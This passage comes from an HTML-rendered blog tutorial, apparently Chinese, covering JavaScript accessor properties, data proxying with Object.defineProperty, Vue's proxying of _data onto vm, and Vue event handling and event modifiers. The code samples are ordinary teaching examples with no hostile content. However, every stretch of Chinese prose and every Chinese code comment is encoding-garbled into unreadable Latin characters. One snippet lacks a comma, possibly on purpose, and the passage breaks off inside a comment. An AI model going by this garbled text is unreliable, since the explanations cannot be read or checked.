<code>user.fullName=</code>ï¼Œå°†ä¼šå‡ºç°é”™è¯¯ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> user = &#123;<br><span class="hljs-attr">surname</span>: <span class="hljs-string">&#x27;gao&#x27;</span>,<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;han&#x27;</span><br>    <br>    <span class="hljs-keyword">get</span> <span class="hljs-title function_">fullName</span>() &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">surname</span>;<br>    &#125;<br><br><span class="hljs-keyword">set</span> <span class="hljs-title function_">fullName</span>(<span class="hljs-params">value</span>) &#123;<br>        <span class="hljs-comment">// è¿™ä¸ªç”¨åˆ°äº†æ–°è¯­æ³• ç»“æ„èµ‹å€¼</span><br>        [<span class="hljs-variable language_">this</span>.<span class="hljs-property">surname</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>] = value.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27; &#x27;</span>);<br>    &#125;<br>&#125;<br><br>user.<span class="hljs-property">fullName</span> = <span class="hljs-string">&#x27;Li Hua&#x27;</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-property">name</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-property">surname</span>);<br></code></pre></td></tr></table></figure><p><strong>ç»ˆäºå¯ä»¥ä»‹ç»æ•°æ®ä»£ç†äº†</strong> ï¼š</p><p>æ•°æ®ä»£ç†ï¼šé€šè¿‡ä¸€ä¸ªå¯¹è±¡ä»£ç†å¯¹å¦ä¸€ä¸ªå¯¹è±¡ä¸­å±æ€§çš„æ“ä½œï¼ˆè¯»&#x2F;å†™ï¼‰</p><p>å…ˆæ¥çœ‹ä¸ªæ¡ˆä¾‹ï¼š</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> obj = &#123;<br>    <span class="hljs-attr">x</span>: <span class="hljs-number">100</span><br>&#125;<br><br><span class="hljs-keyword">let</span> obj2 = &#123;<br>    <span class="hljs-attr">y</span>: <span class="hljs-number">200</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿™æ—¶å€™æä¸€ä¸ªéœ€æ±‚ï¼šæˆ‘ä»¬æƒ³è¦è®¿é—® <strong>obj</strong> ä¸­çš„ <strong>x</strong> çš„å€¼ï¼Œä½†æˆ‘ä»¬æœ€å¥½ä¸è¦ç›´æ¥å»è®¿é—® <strong>obj</strong> ,è€Œæ˜¯æƒ³è¦é€šè¿‡ <strong>obj2</strong>è¿™ä¸ªä»£ç†å¯¹è±¡å»è®¿é—®ã€‚</p><p>è¿™æ—¶å€™å°±å¯ä»¥ç”¨ä¸Š <strong>Object.defineProperty()</strong> ï¼Œç»™ <strong>obj2</strong> æ·»åŠ ä¸Šè®¿é—®å™¨å±æ€§ï¼ˆä¹Ÿå°±æ˜¯getterå’Œsetterï¼‰</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> obj = &#123;<br>    <span class="hljs-attr">x</span>: <span class="hljs-number">100</span><br>&#125;<br><br><span class="hljs-keyword">let</span> obj2 = &#123;<br>    <span class="hljs-attr">y</span>: <span class="hljs-number">200</span><br>&#125;<br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(obj2, <span class="hljs-string">&#x27;x&#x27;</span>, &#123;<br>    <span class="hljs-title function_">get</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> obj.<span class="hljs-property">x</span>;<br>    &#125;,<br>    <span class="hljs-title function_">set</span>(<span class="hljs-params">value</span>) &#123;<br>        obj.<span class="hljs-property">x</span> = value;<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><blockquote><p>è¿™å°±æ˜¯æ•°æ®ä»£ç†ï¼Œä¹Ÿä¸éš¾å§</p></blockquote><p><strong>æ¥ä¸‹æ¥ä»‹ç»Vueä¸­çš„æ•°æ®ä»£ç†</strong></p><ul><li>Vueä¸­çš„æ•°æ®ä»£ç†ï¼šé€šè¿‡vmå¯¹è±¡æ¥ä»£ç†dataå¯¹è±¡ä¸­å±æ€§çš„æ“ä½œï¼ˆè¯»&#x2F;å†™ï¼‰</li><li>Vueä¸­æ•°æ®ä»£ç†çš„å¥½å¤„ï¼šæ›´åŠ æ–¹ä¾¿çš„æ“ä½œdataä¸­çš„æ•°æ®</li><li>åŸºæœ¬åŸç†ï¼š<ul><li>é€šè¿‡Object.defineProperty()æŠŠdataå¯¹è±¡ä¸­æ‰€æœ‰å±æ€§æ·»åŠ åˆ°vmä¸Šã€‚</li><li>ä¸ºæ¯ä¸€ä¸ªæ·»åŠ åˆ°vmä¸Šçš„å±æ€§ï¼Œéƒ½æŒ‡å®šä¸€ä¸ªgetter&#x2F;setterã€‚</li><li>åœ¨getter&#x2F;setterå†…éƒ¨å»æ“ä½œï¼ˆè¯»&#x2F;å†™ï¼‰dataä¸­å¯¹åº”çš„å±æ€§ã€‚</li></ul></li></ul><p>æˆ‘æ¥ç”¨ä¸€ä¸ªæ¡ˆä¾‹æ¥è¯¦ç»†è§£é‡Šè¿™ä¸€ä¸ªè¿‡ç¨‹ã€‚</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- å‡†å¤‡å¥½ä¸€ä¸ªå®¹å™¨--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å­¦æ ¡åç§°ï¼š&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å­¦æ ¡åœ°å€ï¼š&#123;&#123;address&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;å®¶é‡Œè¹²å¤§å­¦&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">address</span>: <span class="hljs-string">&#x27;China&#x27;</span></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬åœ¨æ§åˆ¶å°æ‰“å° new å‡ºæ¥çš„ vm</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124110350315.png" alt="image-20221124110350315"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå†™åœ¨é…ç½®é¡¹ä¸­çš„ data æ•°æ®è¢« ç»‘å®šåˆ°äº† vm å¯¹è±¡ä¸Šï¼Œæˆ‘å…ˆæ¥è®²ç»“æœï¼Œæ˜¯ Vue å°† _data ä¸­çš„ nameï¼Œaddress æ•°æ® ä»£ç†åˆ°<br>vm æœ¬èº«ä¸Šã€‚</p><blockquote><p>ä¸€è„¸æ‡µé€¼ï¼Ÿ</p></blockquote><p>å…ˆæ¥è§£é‡Šä¸‹_data æ˜¯å•¥ï¼Œ _data å°±æ˜¯ vm èº«ä¸Šçš„ _data å±æ€§ï¼Œå°±æ˜¯ä¸‹å›¾é‚£ä¸ª</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124110459865.png" alt="image-20221124110459865"></p><p>è¿™ä¸ª _data æ˜¯ä»å“ªæ¥çš„ï¼Ÿ</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    </span><br><span class="language-javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;å®¶é‡Œè¹²å¤§å­¦&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">address</span>: <span class="hljs-string">&#x27;China&#x27;</span></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>new Vue æ—¶ï¼Œ Vue é€šè¿‡ä¸€ç³»åˆ—å¤„ç†ï¼Œ å°†åŒ¹é…é¡¹ä¸Šçš„ data æ•°æ®ç»‘å®šåˆ°äº† _data<br>è¿™ä¸ªå±æ€§ä¸Šï¼Œå¹¶å¯¹è¿™ä¸ªå±æ€§è¿›è¡Œäº†å¤„ç†ï¼ˆæ•°æ®åŠ«æŒï¼‰ï¼Œä½†è¿™ä¸ªå±æ€§å°±æ˜¯æ¥æºäºé…ç½®é¡¹ä¸­çš„ dataï¼Œæˆ‘ä»¬å¯ä»¥æ¥éªŒè¯ä¸€ä¸‹ã€‚</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    </span><br><span class="language-javascript">    <span class="hljs-keyword">let</span> data1 = &#123;</span><br><span class="language-javascript">         <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;å®¶é‡Œè¹²å¤§å­¦&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">address</span>: <span class="hljs-string">&#x27;China&#x27;</span></span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">    </span><br><span class="language-javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-comment">// æˆ‘ä»¬åœ¨Vue åˆå§‹åŒ–çš„é…ç½®é¡¹ä¸­å†™äº† data å±æ€§ã€‚</span></span><br><span class="language-javascript">        <span class="hljs-attr">data</span>: data1</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124110704095.png" alt="image-20221124110704095"></p><blockquote><p>æ‰“å°ç»“æœä¸ºtrueï¼Œè¯´æ˜ä¸¤è€…å°±æ˜¯åŒä¸€ä¸ª</p></blockquote><p>å¥½äº†ï¼Œå†å›åˆ°æ•°æ®ä»£ç†ä¸Šæ¥ï¼Œå°† <strong>vm._data</strong> ä¸­çš„å€¼ï¼Œå†ä»£ç†åˆ° vm æœ¬èº«ä¸Šæ¥ï¼Œç”¨vm.name ä»£æ›¿ <strong>vm._data.name</strong>ã€‚è¿™å°±æ˜¯ Vue çš„æ•°æ®ä»£ç†</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124110841601.png" alt="image-20221124110841601"></p><p>è¿™ä¸€åˆ‡éƒ½æ˜¯é€šè¿‡ Object.defineProperty() æ¥å®Œæˆçš„ï¼Œæˆ‘æ¥æ¨¡æ‹Ÿä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html">Object.defineProperty(vm, &#x27;name&#x27;, &#123;<br>    get() &#123;<br>        return vm._data.name;<br>    &#125;,<br>    set(value) &#123;<br>        vm._data.name = value<br>    &#125;<br>&#125;)<br><br></code></pre></td></tr></table></figure><blockquote><p>è¿™æ ·æœ‰å•¥æ„ä¹‰ï¼Ÿæ˜æ˜é€šè¿‡ vm._data.name ä¹Ÿå¯ä»¥è®¿é—® name çš„å€¼ï¼Œä¸ºå•¥è´¹åŠ›å»è¿™æ ·æ“ä½œï¼Ÿ</p></blockquote><p>åœ¨æ’å€¼è¯­æ³•ä¸­ï¼Œ<code>&#123;&#123; name &#125;&#125;</code> å–åˆ°çš„å€¼å°±ç›¸å½“äº <code>&#123;&#123; vm.name &#125;&#125;</code>ï¼Œä¸ç”¨æ•°æ®ä»£ç†çš„è¯ï¼Œåœ¨æ’å€¼è¯­æ³•å°±è¦è¿™æ ·å»å†™äº†ã€‚</p><p><code>&#123;&#123; _data. name &#125;&#125;</code> è¿™ä¸ç¬¦åˆç›´è§‰ï¼Œæ€ªæ€ªçš„ã€‚vue è¿™æ ·è®¾è®¡æ›´åˆ©äºå¼€å‘è€…å¼€å‘ï¼Œæˆ‘ä»¬åœ¨ç ”ç©¶åŸç†ä¼šè§‰å¾—æœ‰äº›å¤æ‚ï¼ˆç¬‘~ï¼‰</p><p>æ¥ä¸ªå°šç¡…è°·å¼ å¤©ç¦¹è€å¸ˆåšçš„å›¾ï¼ˆéå¸¸æ¨èå»çœ‹ä»–çš„è¯¾ï¼Œè®²çš„éå¸¸å¥½ï¼‰</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/8ccad88c5e40497587dadb3db07e1821.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="1-7-äº‹ä»¶å¤„ç†"><a href="#1-7-äº‹ä»¶å¤„ç†" class="headerlink" title="1.7 äº‹ä»¶å¤„ç†"></a>1.7 äº‹ä»¶å¤„ç†</h2><p>äº‹ä»¶çš„åŸºæœ¬ä½¿ç”¨ï¼š</p><ol><li>ä½¿ç”¨v-on:xxxæˆ–@xxxç»‘å®šäº‹ä»¶ï¼Œå…¶ä¸­ xxx æ˜¯äº‹ä»¶å</li><li>äº‹ä»¶çš„å›è°ƒéœ€è¦é…ç½®åœ¨methodså¯¹è±¡ä¸­ï¼Œæœ€ç»ˆä¼šåœ¨vmä¸Š</li><li>methodsä¸­é…ç½®çš„å‡½æ•°ï¼Œä¸è¦ç”¨ç®­å¤´å‡½æ•°ï¼Œå¦åˆ™ this å°±ä¸æ˜¯vmäº†</li><li>methodsä¸­é…ç½®çš„å‡½æ•°ï¼Œéƒ½æ˜¯è¢« Vueæ‰€ç®¡ç†çš„å‡½æ•°ï¼Œthis çš„æŒ‡å‘æ˜¯vmæˆ–ç»„ä»¶å®ä¾‹å¯¹è±¡</li><li>@click&#x3D;â€demoâ€å’Œ@click&#x3D;â€demo($event)â€æ•ˆæœä¸€è‡´ï¼Œä½†åè€…å¯ä»¥ä¼ å‚</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>äº‹ä»¶çš„åŸºæœ¬ä½¿ç”¨<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- å¼•å…¥Vue --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>      <span class="hljs-comment">&lt;!-- &lt;button v-on:click=&quot;showInfo&quot;&gt;ç‚¹æˆ‘æç¤ºä¿¡æ¯&lt;/button&gt; --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;showInfo1&quot;</span>&gt;</span>ç‚¹æˆ‘æç¤ºä¿¡æ¯1ï¼ˆä¸ä¼ å‚ï¼‰<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;showInfo2($event,66)&quot;</span>&gt;</span>ç‚¹æˆ‘æç¤ºä¿¡æ¯2ï¼ˆä¼ å‚ï¼‰<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">      <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span> <span class="hljs-comment">//é˜»æ­¢ vue åœ¨å¯åŠ¨æ—¶ç”Ÿæˆç”Ÿäº§æç¤ºã€‚</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">      <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">          <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;cess&#x27;</span>,</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">          <span class="hljs-title function_">showInfo1</span>(<span class="hljs-params">event</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(event.<span class="hljs-property">target</span>.<span class="hljs-property">innerText</span>)</span><br><span class="language-javascript">            <span class="hljs-comment">// console.log(this) // æ­¤å¤„çš„thisæ˜¯vm</span></span><br><span class="language-javascript">            <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;åŒå­¦ä½ å¥½ï¼&#x27;</span>)</span><br><span class="language-javascript">          &#125;,</span><br><span class="language-javascript">          <span class="hljs-title function_">showInfo2</span>(<span class="hljs-params">event, number</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(event, number)</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(event.<span class="hljs-property">target</span>.<span class="hljs-property">innerText</span>)</span><br><span class="language-javascript">            <span class="hljs-comment">// console.log(this) // æ­¤å¤„çš„thisæ˜¯vm</span></span><br><span class="language-javascript">            <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;åŒå­¦ä½ å¥½ï¼ï¼&#x27;</span>)</span><br><span class="language-javascript">          &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">      &#125;)</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>Vueä¸­çš„äº‹ä»¶ä¿®é¥°ç¬¦</strong></p><ul><li>&#x3D;&#x3D;prevent&#x3D;&#x3D;é˜»æ­¢é»˜è®¤äº‹ä»¶ï¼ˆå¸¸ç”¨ï¼‰</li><li>&#x3D;&#x3D;stop&#x3D;&#x3D;é˜»æ­¢äº‹ä»¶å†’æ³¡ï¼ˆå¸¸ç”¨ï¼‰</li><li>&#x3D;&#x3D;once&#x3D;&#x3D;äº‹ä»¶åªè§¦å‘ä¸€æ¬¡ï¼ˆå¸¸ç”¨ï¼‰</li><li><strong>capture</strong>ä½¿ç”¨äº‹ä»¶çš„æ•è·æ¨¡å¼</li><li><strong>self</strong>åªæœ‰event.targetæ˜¯å½“å‰æ“ä½œçš„å…ƒç´ æ—¶æ‰è§¦å‘äº‹ä»¶</li><li><strong>passive</strong>äº‹ä»¶çš„é»˜è®¤è¡Œä¸ºç«‹å³æ‰§è¡Œï¼Œæ— éœ€ç­‰å¾…äº‹ä»¶å›è°ƒæ‰§è¡Œå®Œæ¯•</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>äº‹ä»¶ä¿®é¥°ç¬¦<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- å¼•å…¥Vue --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">      * &#123;<span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;&#125;</span><br><span class="language-css">      <span class="hljs-selector-class">.demo1</span> &#123;<span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;<span class="hljs-attribute">background-color</span>: skyblue;&#125;</span><br><span class="language-css">      <span class="hljs-selector-class">.box1</span> &#123;<span class="hljs-attribute">padding</span>: <span class="hljs-number">5px</span>;<span class="hljs-attribute">background-color</span>: skyblue;&#125;</span><br><span class="language-css">      <span class="hljs-selector-class">.box2</span> &#123;<span class="hljs-attribute">padding</span>: <span class="hljs-number">5px</span>;<span class="hljs-attribute">background-color</span>: white;&#125;</span><br><span class="language-css">      <span class="hljs-selector-class">.list</span> &#123;<span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;<span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;<span class="hljs-attribute">background-color</span>: skyblue;<span class="hljs-attribute">overflow</span>: auto;&#125;</span><br><span class="language-css">      <span class="hljs-selector-tag">li</span> &#123;<span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;&#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>æ¬¢è¿æ¥åˆ°&#123;&#123; name &#125;&#125;å­¦ä¹ <span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>      <span class="hljs-comment">&lt;!-- 